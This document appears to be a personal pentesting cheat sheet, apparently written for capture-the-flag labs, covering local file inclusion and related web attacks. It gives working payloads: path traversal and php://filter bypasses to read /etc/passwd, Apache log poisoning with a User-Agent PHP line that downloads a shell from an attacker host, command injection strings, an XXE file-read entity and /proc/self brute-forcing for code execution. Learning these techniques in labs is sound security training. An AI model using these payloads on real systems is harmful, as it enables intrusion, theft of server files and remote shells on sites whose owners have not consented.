---
title: LFI 🎃
---
## Nice articcles to read

- [invicti.com](https://www.invicti.com/blog/web-security/local-file-inclusion-vulnerability/)
- [outpost24: lfi to RCE](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2/)

## Classic ones

- If you find the php code with the filter like:

```php
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
```

- You can just apply a filter like: `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../etc/passwd`

## Adding parameter file to url

- Linux File Inclussion
  - Check the `url` adding parameter `file`

![](Pasted%20image%2020240213235821.png)

## Fuzzing it

- FUZZ it using this command:
  - [Useful wordlist found here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/)

```shell
wfuzz -c -w dirTraversal.txt  --hw 0 http://10.10.70.109/?view=FUZZ
```


## Bypassing filters with encodings


- If the backend is filtering by checking the input, try this:

```shell
http://IP/?view=php://filter/FOLDER/convert.base64-encode/resource=index

# example
http://mafialive.thm/test.php?view=//filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
```

- Check out the &ext variable and put it empty because it won't get the file extension

## Log poisoning

- To perform this, first check out if you have access to the log file in an apache with Burpsuite:



- Log file contamination

```shell
http://IP/?view=dog../../../../../cat/../var/log/apache2/access.log&ext=
```


## Exploiting the User-Agent field

- Exploit the User-Agent Field:
  - First create a shell like the PentestMonkey one
  - Create a python server
  - Load the petition (like log file contamination petition) and capture it with BurpSuite
  - Modify the User-Agent field with this command:

```shell
<?php file_put_contents('shell.php', file_get_contents('http://IP_ATTACK:PORT/shell.php'))?>
```

- Then access to `http://IP/shell.php` and you got the reverse shell

## Regex filtering

When we can echo commands try and it's using a regex like: `/[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/` try:

```shell
http://IP_HOST/echo.php?search=id+|+bash
# Then just try other commands like
echo.php?search=ls+|+bash
# Then try to input a reverse shell
```

## Web filtering

If a web shell filters your input, try to encode it into `base64`

![](Pasted%20image%2020240417160455.png)

- If it doesn't work, try some [Command Injection 💄](command_injection.md)

## XML file inclusion (XXE)

- If a web accepts XML, it could be vulnerable to XXE.
- You can try to upload a code like this to inspect the system:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>&name;</name>
  <author>Pavandeep</author>
  <com>Hacking Articles</com>
</comment>
```

- Change the `"file:///etc/passwd"` for the one you want

## Lfi to RCE

If you can read some files by some kind of escape, we can bruteforce the `/proc/self/` directory in Apache.

This directory holds information about different processes. Each process is distinguished by its PID as shown below:

![](Pasted%20image%2020240501160143.png)

Every process can access its available information by requesting the `/proc/self` directory.

As Apache is requesting this file (via the LFI vulnerability) and since the file is located inside Apache’s proc directory, we can use `/proc/self` instead of searching for Apache’s PID. In a brief recap we could say that `/proc/self/environ` is – roughly- equal to `/proc/<apache_pid>/environ`.

The contents of this directory are [symbolic links](https://www.nixtutor.com/freebsd/understanding-symbolic-links/) pointing to the actual file of the process’ open file handlers:

![](Pasted%20image%2020240501160310.png)

It goes without saying that during the attack we do not know which symbolic link points to which file. The file we will be interested in is the Apache [access log](https://httpd.apache.org/docs/2.4/logs.html#accesslog). We choose this file as it’s dynamic and can be changed based on our input.

To identify the file, we will use Burp Intruder.

> First, we set up the position of our payload.

![](Pasted%20image%2020240501160409.png)

> As File Descriptors are identified by a numeric id, we choose the proper payload. `Payloads > Payload type: Numbers`

![](Pasted%20image%2020240501160501.png)

> A successfull attack should look like:

![](Pasted%20image%2020240501161147.png)

Now we would perform a **Log Poisoning** attack.

## Path traversal

- Nice tool to use (automatic tool): [PathTraversal](https://github.com/gotr00t0day/PathTraversal)

Example:

```shell
https://invented-domain.com/image?filename=image.png
# You can perform
https://invented-domain.com/image?filename=....//....//....//etc/passwd
```

Otherwise, if you want to do it manual you can use BurpSuite and try some combinations.

## Blind OS command injection

If you've got this kind of request:

![](Pasted%20image%2020240513160938.png)

Use the following payload:

```shell
||whoami>>/var/www/images/results.txt||
```

![](Pasted%20image%2020240513161049.png)